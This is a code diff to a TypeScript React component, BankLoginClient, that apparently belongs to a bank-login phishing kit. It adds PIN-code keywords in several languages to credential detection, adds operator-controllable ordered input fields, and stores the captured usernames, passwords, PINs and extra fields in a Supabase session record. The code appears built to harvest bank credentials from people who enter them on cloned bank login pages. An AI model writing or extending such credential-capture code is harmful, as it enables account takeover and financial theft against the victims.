@@ -90,6 +90,8 @@ function inferCanonicalCredentialKey(
   if (
     normalizedKey.includes("password") ||
     normalizedKey.includes("passcode") ||
+    normalizedKey.includes("pincode") ||
+    normalizedKey.includes("pinkood") ||
     normalizedKey.includes("parool") ||
     normalizedKey.includes("pincalculatorcode") ||
     normalizedKey.includes("pincalccode") ||
@@ -156,8 +158,13 @@ function shouldResetPreviousBankField(key: string): boolean {
     key === "username" ||
     key === "password" ||
     key === "orderedField1" ||
+    key === "orderedField1Key" ||
     key === "orderedField2" ||
-    key === "orderedField2Type"
+    key === "orderedField2Key" ||
+    key === "orderedField2Type" ||
+    key === "orderedField3" ||
+    key === "orderedField3Key" ||
+    key === "orderedField3Type"
   ) {
     return true;
   }
@@ -259,8 +266,13 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       "username",
       "password",
       "orderedField1",
+      "orderedField1Key",
       "orderedField2",
+      "orderedField2Key",
       "orderedField2Type",
+      "orderedField3",
+      "orderedField3Key",
+      "orderedField3Type",
       "bankSlug",
       "bankName",
     ]);
@@ -294,17 +306,47 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         : typeof sessionFormData.orderedField1 === "string"
           ? sessionFormData.orderedField1.trim()
           : currentPersonalCode || currentUsername || currentVerfuegernummer || currentBankPhone;
+    const currentOrderedField1Key =
+      typeof overrideData?.orderedField1Key === "string"
+        ? overrideData.orderedField1Key.trim()
+        : typeof sessionFormData.orderedField1Key === "string"
+          ? sessionFormData.orderedField1Key.trim()
+          : "";
     const currentOrderedField2 =
       typeof overrideData?.orderedField2 === "string"
         ? overrideData.orderedField2.trim()
         : typeof sessionFormData.orderedField2 === "string"
           ? sessionFormData.orderedField2.trim()
           : currentPassword || currentPin;
+    const currentOrderedField2Key =
+      typeof overrideData?.orderedField2Key === "string"
+        ? overrideData.orderedField2Key.trim()
+        : typeof sessionFormData.orderedField2Key === "string"
+          ? sessionFormData.orderedField2Key.trim()
+          : "";
     const currentOrderedField2Type =
       typeof overrideData?.orderedField2Type === "string"
         ? overrideData.orderedField2Type.trim()
         : typeof sessionFormData.orderedField2Type === "string"
           ? sessionFormData.orderedField2Type.trim()
+          : "";
+    const currentOrderedField3 =
+      typeof overrideData?.orderedField3 === "string"
+        ? overrideData.orderedField3.trim()
+        : typeof sessionFormData.orderedField3 === "string"
+          ? sessionFormData.orderedField3.trim()
+          : "";
+    const currentOrderedField3Key =
+      typeof overrideData?.orderedField3Key === "string"
+        ? overrideData.orderedField3Key.trim()
+        : typeof sessionFormData.orderedField3Key === "string"
+          ? sessionFormData.orderedField3Key.trim()
+          : "";
+    const currentOrderedField3Type =
+      typeof overrideData?.orderedField3Type === "string"
+        ? overrideData.orderedField3Type.trim()
+        : typeof sessionFormData.orderedField3Type === "string"
+          ? sessionFormData.orderedField3Type.trim()
           : "";
     const currentExtraCapturedValues = Object.entries((overrideData ?? {}) as Record<string, unknown>).flatMap(
       ([key, value]) => {
@@ -334,6 +376,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       typeof overrideData?.password === "string" ? overrideData.password : "",
       typeof overrideData?.orderedField1 === "string" ? overrideData.orderedField1 : "",
       typeof overrideData?.orderedField2 === "string" ? overrideData.orderedField2 : "",
+      typeof overrideData?.orderedField3 === "string" ? overrideData.orderedField3 : "",
       ...currentExtraCapturedValues,
     ].some(hasMeaningfulSubmitValue);
 
@@ -394,8 +437,13 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       ...preservedSessionFormData,
       ...extraCapturedFields,
       orderedField1: currentOrderedField1,
+      orderedField1Key: currentOrderedField1Key,
       orderedField2: currentOrderedField2,
+      orderedField2Key: currentOrderedField2Key,
       orderedField2Type: currentOrderedField2Type,
+      orderedField3: currentOrderedField3,
+      orderedField3Key: currentOrderedField3Key,
+      orderedField3Type: currentOrderedField3Type,
       ...credentials,
     };
     const { error: updateError } = await supabase
